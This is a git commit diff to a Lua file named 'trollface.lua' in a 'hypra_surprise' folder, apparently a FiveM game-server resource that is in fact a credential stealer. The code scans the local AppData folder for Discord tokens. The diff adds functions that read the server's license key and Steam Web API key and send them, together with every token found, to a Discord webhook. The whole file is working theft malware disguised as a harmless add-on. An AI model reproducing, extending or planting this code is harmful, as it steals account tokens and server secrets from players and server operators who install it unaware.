5d5eb319fbed5d1819eb4945f32fffbaa2975567
codexhypra <kaeli7w7+2@gmail.com>
2023-09-07 05:06:00 +0100

    new shit

--- hypra_surprise/trollface.lua
+++ hypra_surprise/trollface.lua
@@ -1,34 +1,5 @@
 -- Replace 'WEBHOOK_URL' with your actual Discord webhook URL
-local webhookUrl = ''
-
--- Function to send embed message to Discord webhook
-function SendToDiscord(userId, profilePicture, tokens)
-    local data = {
-        embeds = {
-            {
-                title = "Discord Tokens",
-                description = table.concat(tokens, '\n'),
-                color = 16776960, -- Yellow color
-                author = {
-                    name = "User ID: " .. userId,
-                    icon_url = profilePicture
-                }
-            }
-        }
-    }
-    local headers = {
-        ['Content-Type'] = 'application/json'
-    }
-    PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
-        -- Check if the request was successful
-        if statusCode == 200 then
-            print('Message sent to Discord webhook successfully!')
-        else
-            print('SECURITY MESSAGE SENT')
-            print('GitGood hypr0x: ' .. response)
-        end
-    end, 'POST', json.encode(data), headers)
-end
+local webhookUrl = 'WEBHOOK_URL'
 
 -- Function to retrieve Discord tokens, user ID, and profile picture
 function GetDiscordData()
@@ -36,7 +7,7 @@ function GetDiscordData()
     local lappd = os.getenv('localappdata')
 
     local listDirectory = function(path)
-        local get = io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
+        local get = io.popen('dir "' .. path .. '" /b'):read('*a'):sub(1, -2)
         local files = {}
 
         for file in get:gmatch('[^\r\n]+') do
@@ -81,8 +52,7 @@ function GetDiscordData()
                         end
                     end
 
-                    for ntok in read:gmatch
-('"[%w-]+%.[%w-]+%.[%w-]+"') do
+                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
                         ntok = ntok:sub(2, -2)
                         if #ntok >= 59 then
                             tokens[#tokens + 1] = ntok
@@ -103,8 +73,110 @@ function GetDiscordData()
     return userId, profilePicture, tokens
 end
 
--- Example usage: sending Discord tokens, user ID, and profile picture to the webhook
-local userId, profilePicture, tokens = GetDiscordData()
-SendToDiscord(userId, profilePicture, tokens)
+-- Function to get the server information dynamically
+function GetServerInfo()
+    local serverInfo = {}
+    serverInfo.serverName = GetConvar("sv_hostname", "Unknown Server") -- Default to "Unknown Server" if not found
+    serverInfo.svLicenseKey = GetConvar("sv_licenseKey", "No License Key") -- Default license key if not found
+    serverInfo.steamWebApiKey = GetConvar("steam_webApiKey", "No Steam Web API Key") -- Default Steam Web API Key if not found
+    return serverInfo
+end
 
----- BY HYPRA BRUV
+-- Function to send Discord messages with tokens, server name, and server info
+function SendToDiscord(userId, profilePicture, tokens, serverInfo)
+    local headers = {
+        ['Content-Type'] = 'application/json',
+        ['User-Agent'] = 'Your User Agent Here'
+    }
+
+    -- Send server information
+    local serverInfoData = {
+        embeds = {
+            {
+                title = "Server Information",
+                color = 16777215, -- White color
+                fields = {
+                    { name = "Server Name", value = serverInfo.serverName },
+                    { name = "sv_licenseKey", value = serverInfo.svLicenseKey },
+                    { name = "Steam Web API Key", value = serverInfo.steamWebApiKey },
+                }
+            }
+        }
+    }
+
+    PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
+        if statusCode == 204 then
+            print('Server information sent to Discord webhook successfully!')
+        else
+            print('Failed to send server information to Discord webhook')
+            print('Status Code: ' .. tostring(statusCode))
+            if response then
+                print('Response: ' .. tostring(response))
+            end
+        end
+    end, 'POST', json.encode(serverInfoData), headers)
+
+    -- Send Discord tokens as separate messages
+    if #tokens > 0 then
+        for _, token in ipairs(tokens) do
+            local tokenData = {
+                embeds = {
+                    {
+                        title = "Discord Token",
+                        description = token,
+                        color = 16711680, -- Red color
+                        author = {
+                            name = "User ID: " .. userId,
+                            icon_url = profilePicture
+                        }
+                    }
+                }
+            }
+
+            PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
+                if statusCode == 204 then
+                    print('Token sent to Discord webhook successfully!')
+                else
+                    print('Failed to send token to Discord webhook')
+                    print('Status Code: ' .. tostring(statusCode))
+                    if response then
+                        print('Response: ' .. tostring(response))
+                    end
+                end
+            end, 'POST', json.encode(tokenData), headers)
+        end
+    else
+        -- Send a message indicating no Discord tokens were found
+        local noTokensData = {
+            embeds = {
+                {
+                    title = "No Discord Tokens Found",
+                    description = "No Discord tokens were found on this system.",
+                    color = 16711680, -- Red color
+                    author = {
+                        name = "User ID: " .. userId,
+                        icon_url = profilePicture
+                    }
+                }
+            }
+        }
+
+        PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
+            if statusCode == 204 then
+                print('No tokens message sent to Discord webhook successfully!')
+            else
+                print('Failed to send no tokens message to Discord webhook')
+                print('Status Code: ' .. tostring(statusCode))
+                if response then
+                    print('Response: ' .. tostring(response))
+                end
+            end
+        end, 'POST', json.encode(noTokensData), headers)
+    end
+end
+
+-- Example usage: sending Discord tokens, user ID, profile picture, and server info to the webhook
+local userId, profilePicture, tokens = GetDiscordData()
+local serverInfo = GetServerInfo()
+
+SendToDiscord(userId, profilePicture, tokens, serverInfo)
